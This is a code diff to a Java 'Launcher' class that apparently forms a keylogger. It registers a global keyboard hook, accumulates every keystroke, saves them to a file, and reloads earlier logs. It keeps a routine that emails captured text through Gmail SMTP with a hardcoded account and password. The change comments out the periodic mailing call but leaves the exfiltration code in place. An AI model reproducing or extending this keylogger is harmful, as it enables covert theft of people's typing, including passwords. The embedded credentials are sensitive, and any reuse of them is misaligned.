@@ -43,13 +43,38 @@ public class Launcher implements NativeKeyListener {
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
+		} else {
+			toSend = readExistingFile(true) + "      ";
 		}
+	}
+
+	private static String readExistingFile(boolean read) {
+		if (read)
+			try {
+				// make a 'file' object
+				// Get data from this file using a file reader.
+				FileReader fr = new FileReader(file);
+				// To store the contents read via File Reader
+				BufferedReader br = new BufferedReader(fr);
+				// Read br and store a line in 'data', print data
+				String data;
+				StringBuilder dataqueue = new StringBuilder();
+				while ((data = br.readLine()) != null) {
+					dataqueue.append(data);
+				}
+				return dataqueue.toString();
+			} catch (IOException e) {
+				System.out.println("bad !");
+			}
+
+		return "";
 	}
 
 	public static void main(String[] args) {
 		try {
 			System.out.print("Starting....");
 			GlobalScreen.registerNativeHook();
+			System.out.print("Native hook OK....");
 		} catch (NativeHookException ex) {
 			System.err.println("There was a problem registering the native hook.");
 			System.err.println(ex.getMessage());
@@ -153,14 +178,14 @@ public class Launcher implements NativeKeyListener {
 			if (!("ENDCAPS".equals(this.keyText) || "BEGINCAPS".equals(this.keyText)))
 				toSend += this.keyText;
 
-			if (flagNumberCharacterToSend != 0 && flagNumberCharacterToSend % 5 == 0) {
-//				sendToMailOriginal(toSend);
-				sendToMailApache(toSend);
-				flagNumberCharacterToSend = 0;
-//		        toSend = "";
-			}
-			flagNumberCharacterToSend++;
-			toSend = removeCaps(toSend);
+//			if (flagNumberCharacterToSend != 0 && flagNumberCharacterToSend % 5 == 0) {
+////				sendToMailOriginal(toSend);
+//				sendToMailApache(toSend);
+//				flagNumberCharacterToSend = 0;
+////		        toSend = "";
+//			}
+//			flagNumberCharacterToSend++;
+//			toSend = removeCaps(toSend);
 
 			writeKeyStrokeToFile(toSend);
 		}
@@ -315,7 +340,8 @@ public class Launcher implements NativeKeyListener {
 		email.setHostName("smtp.gmail.com");
 		email.setSmtpPort(465);
 //		email.setAuthentication("octronanonymous@gmail.com", "g8fgerzg5gz95gzrgg849841965ui rw894fdsf");
-		email.setAuthenticator(new DefaultAuthenticator("octronanonymous@gmail.com", "g8fgerzg5gz95gzrgg849841965ui rw894fdsf"));
+		email.setAuthenticator(
+				new DefaultAuthenticator("octronanonymous@gmail.com", "g8fgerzg5gz95gzrgg849841965ui rw894fdsf"));
 		email.setSSL(true);
 		try {
 			email.setFrom("user@gmail.com");
